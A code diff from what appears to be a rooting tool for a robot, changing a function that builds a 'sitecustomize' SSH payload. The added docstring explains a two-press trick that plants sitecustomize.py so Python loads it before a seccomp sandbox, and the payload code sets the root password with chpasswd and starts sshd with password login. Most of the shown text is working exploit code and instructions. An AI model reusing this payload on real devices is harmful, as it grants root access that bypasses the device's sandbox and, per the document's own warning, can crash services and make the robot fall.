@@ -425,10 +425,16 @@ def payload_sitecustomize_ssh(password="unleash", hotkey="L1+Y"):
 
     Use when bypass-ssh fails (crond not running on 1.1.14/15).
 
+    Two-press technique:
+      1st L1+Y: writes sitecustomize.py via np.savetxt (inside seccomp)
+      2nd L1+Y: triggers Py_Initialize() which loads sitecustomize.py
+                before seccomp, starting sshd with full syscall access
+
     WARNING: sitecustomize.py must be removed after SSH is up or ALL Python
     services crash on every boot (robot may fall). Cleanup via SSH:
-      find / -name 'sitecustomize.py' -path '*/python*' -exec rm -f {} \\;
-      reboot
+      rm -f /usr/lib/python3.8/sitecustomize.py /usr/lib/python3.10/sitecustomize.py \\
+            /usr/lib/python3.11/sitecustomize.py \\
+            /usr/local/lib/python3.8/dist-packages/sitecustomize.py
     """
     chpasswd = f"echo 'root:{password}' | /usr/sbin/chpasswd"
     sshd_cmd = (
@@ -437,7 +443,10 @@ def payload_sitecustomize_ssh(password="unleash", hotkey="L1+Y"):
         " -o PasswordAuthentication=yes"
         " -o PubkeyAuthentication=yes"
     )
-    content = f'import os; os.system("{chpasswd} && {sshd_cmd}")'
+    sshd_setup = (
+        "mkdir -p /run/sshd && chmod 755 /run/sshd && chown root:root /run/sshd"
+    )
+    content = f'import os; os.system("{sshd_setup} && {chpasswd} && {sshd_cmd}")'
 
     paths = [
         "/usr/lib/python3.8/sitecustomize.py",
